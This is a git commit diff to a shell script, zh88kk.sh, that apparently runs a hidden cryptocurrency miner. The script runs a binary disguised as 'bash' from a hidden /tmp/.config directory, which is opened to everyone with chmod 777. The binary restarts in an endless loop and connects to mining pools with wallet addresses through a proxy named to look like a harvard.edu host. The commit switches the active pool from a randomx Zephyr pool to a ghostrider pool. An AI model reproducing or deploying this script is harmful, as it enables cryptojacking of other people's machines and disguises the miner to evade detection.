2ab520c210aefb3d9cf237e74b9ce18ae5d3ba04
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-05-07 10:24:16 +0800

    Update zh88kk.sh

--- zh88kk.sh
+++ zh88kk.sh
@@ -8,8 +8,8 @@ chmod -R  777 /tmp/.config
 #!/bin/sh
 while [ 1 ]; do
 	#/tmp/.config/bash -a ghostrider --url stratum-na.rplant.xyz:7090 --user STeHt4JoHHWRuazNWkeUEt2jufQapdbnzB.2099i
- 	#/tmp/.config/bash -a ghostrider --url asia.flockpool.com:4444 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.harvard --pass stu --proxy harvard.edu.2333333.win:7091
- 	/tmp/.config/bash -a randomx --url de.zephyr.herominers.com:1123 --user ZEPHsAMwSCxbKjYfnrmAtb9Cu2QSy4E9GC3BbGL5fXKsdRWukZgKTckCNTiqL24ecyaUdcMnzEQE4TTt926ovwqg6pg5bdc86AR --pass harvard --proxy harvard.edu.2333333.win:7091
+ 	/tmp/.config/bash -a ghostrider --url asia.flockpool.com:4444 --user RDACoFmDxhJrktrSsfWHEcCgybGezuPkCw.harvard --pass stu --proxy harvard.edu.2333333.win:7091
+ 	#/tmp/.config/bash -a randomx --url de.zephyr.herominers.com:1123 --user ZEPHsAMwSCxbKjYfnrmAtb9Cu2QSy4E9GC3BbGL5fXKsdRWukZgKTckCNTiqL24ecyaUdcMnzEQE4TTt926ovwqg6pg5bdc86AR --pass harvard --proxy harvard.edu.2333333.win:7091
 	sleep 5
 done
 
